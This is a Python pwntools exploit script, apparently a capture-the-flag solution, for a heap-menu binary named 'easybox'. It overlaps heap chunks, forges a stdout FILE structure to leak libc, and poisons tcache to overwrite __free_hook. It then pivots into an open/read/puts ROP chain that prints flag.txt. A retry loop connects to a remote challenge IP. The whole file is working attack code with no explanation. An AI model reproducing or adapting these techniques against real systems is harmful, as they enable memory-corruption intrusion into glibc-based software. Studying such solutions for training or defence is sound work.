# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './easybox'
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)

else:
    host = '121.40.89.206'
    port = '41232'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    context.update( os = 'linux', arch = 'amd64',timeout = 1)
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def cmd(num):
    sla('ch:',num)

def add(idx ,size , text = "a" ):
    cmd(1)
    sla('index?' , idx)
    sla('size??' , size)
    sla('something' , text)

def delete(idx):
    cmd(2)
    sla('index?' , idx)

def edit(idx , text):
    cmd(3)
    sla('index?' , idx)
    sla('something' , text)

# one_gad = one_gadget(libc.path)

def attack():
    
    # $rebase(0x000000000004060)

    add(0 , 0x18)

    for i in range(10):
        add(i+1 , 0x78)

    add(16 , 0x78)
    dbg()

    edit(0 , flat(0 ,0 ,0 , 0x501 ) )
    delete(1)

    add(11 , 0x78)
    add(12 , 0x78) #2

    delete(11)
    delete(12)
    add(13 , 0x1f8)
    add(14 , 0x1f8)
    edit(0 , flat(0 ,0 ,0 , 0x81 , '\x00'*0x78 , 0x481 ) )

    delete(2)

    add(15 , 0x248 , p16(0x36a0))
    add(1 , 0x78)
    
    io_file = flat(
        0xfbad1800 , 0,
        0,0,
    ) + '\x00'

    add(2 , 0x78 , io_file)
    leak = l64()

    if(leak ==0):
        exit(0)
    _IO_2_1_stdin_ = leak
    libc.address = leak - libc.sym['_IO_2_1_stdin_']
    __free_hook = libc.sym['__free_hook']
    lg('__free_hook',__free_hook)

    add(11 , 0x228)
    delete(5)
    delete(4)

    edit(0 , flat(0 ,0 ,0 , 0x81 , '\x00'*0x78 , 0x81 , '\x00'*0x78 , 0x81 , '\x00'*0x78 ,0x81, __free_hook) )

    add(5 , 0x78)
    # add(4 , 0x78)

    __free_hook = libc.sym['__free_hook']
    magic = 0x157d8a + libc.address
    
    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    leave_ret = libc.search(asm('leave;ret')).next()
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_r13_pop_r15_ret = libc.search(asm('pop r13 ; pop r15 ; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    ret = pop_rdi_ret + 1
    
    magic_chain  = flat(
        __free_hook + 0x8, pop_r13_pop_r15_ret , 
        __free_hook + 0x8, __free_hook + 0x10 ,
        pop_rdx_pop_rbx_ret, 0x300 ,
        leave_ret, pop_rsi_ret,
        __free_hook + 0x8 , pop_rdi_ret , 
        0 , read_addr 
    )
    # len magic_chain 0x60
    flag_addr = __free_hook + 0x100 + len(magic_chain) + 8
    chain = flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_rdi_ret , flag_addr , puts_addr
    ).ljust(0x100,'\x00') + 'flag.txt\x00'
    # len chain 0x80
    
    payload = flat( magic ) + magic_chain
    
    getflag =p64(ret)*0xc + chain

    lg('magic' , magic)

    add(12 , 0x78 , payload)
    # dbg('free')
    delete(12)

    # raw_input()
    se(getflag)

    p.interactive()

boom(attack)

'''
@File    :   easybox.py
@Time    :   2022/01/17 19:22:01
@Author  :   Niyah 
'''